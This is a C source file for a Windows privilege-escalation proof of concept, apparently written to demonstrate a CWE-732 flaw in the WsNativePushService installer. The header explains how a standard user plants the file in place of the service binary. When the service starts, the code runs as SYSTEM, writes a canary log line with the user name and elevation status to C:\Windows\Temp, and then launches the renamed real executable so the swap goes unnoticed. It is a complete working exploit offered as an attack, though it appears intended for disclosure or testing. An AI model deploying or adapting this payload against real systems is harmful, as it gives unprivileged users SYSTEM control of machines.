/*
 * svc_replace.c -- Service binary replacement payload
 * Replaces WsNativePushService.exe entirely.
 * Runs canary as SYSTEM, then launches the real exe to maintain service.
 *
 * Attack: CWE-732 (Incorrect Permission Assignment)
 * The installer grants BUILTIN\Users Full Control on the service binary.
 * Standard user can rename the real exe and plant this replacement.
 * Service runs as LocalSystem on next boot/restart.
 *
 * Build: cl.exe svc_replace.c /Fe:WsNativePushService.exe /O1 /GS- /link advapi32.lib user32.lib
 */

#include <windows.h>

static SERVICE_STATUS g_svcStatus;
static SERVICE_STATUS_HANDLE g_svcHandle;

static void canary(void)
{
    HANDLE f;
    DWORD w;
    char b[256];
    int n;
    SYSTEMTIME t;
    char u[64];
    DWORD ul = 64;
    BOOL elev = FALSE;
    HANDLE hTok;

    GetLocalTime(&t);
    GetUserNameA(u, &ul);

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te;
        DWORD rl;
        if (GetTokenInformation(hTok, TokenElevation, &te, sizeof(te), &rl))
            elev = te.TokenIsElevated;
        CloseHandle(hTok);
    }

    n = wsprintfA(b, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|BINARY_REPLACE\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        u, elev, GetCurrentProcessId());

    f = CreateFileA("C:\\Windows\\Temp\\ws_diag.log",
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        SetFilePointer(f, 0, NULL, FILE_END);
        WriteFile(f, b, n, &w, NULL);
        CloseHandle(f);
    }
}

static void launch_real(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char path[MAX_PATH];
    char *lastSlash;

    GetModuleFileNameA(NULL, path, MAX_PATH);
    lastSlash = path;
    for (char *p = path; *p; p++) {
        if (*p == '\\') lastSlash = p;
    }
    *(lastSlash + 1) = '\0';
    lstrcatA(path, "WsNativePushService_real.exe");

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static void WINAPI SvcHandler(DWORD ctrl)
{
    switch (ctrl) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        g_svcStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(g_svcHandle, &g_svcStatus);
}

static void WINAPI SvcMain(DWORD argc, LPSTR *argv)
{
    (void)argc; (void)argv;

    g_svcHandle = RegisterServiceCtrlHandlerA("NativePushService", SvcHandler);
    if (!g_svcHandle) return;

    g_svcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_svcStatus.dwCurrentState = SERVICE_RUNNING;
    g_svcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    g_svcStatus.dwWin32ExitCode = 0;
    SetServiceStatus(g_svcHandle, &g_svcStatus);

    canary();
    launch_real();

    while (g_svcStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(5000);
    }
}

int main(void)
{
    SERVICE_TABLE_ENTRYA svc[] = {
        { "NativePushService", SvcMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(svc);
    return 0;
}
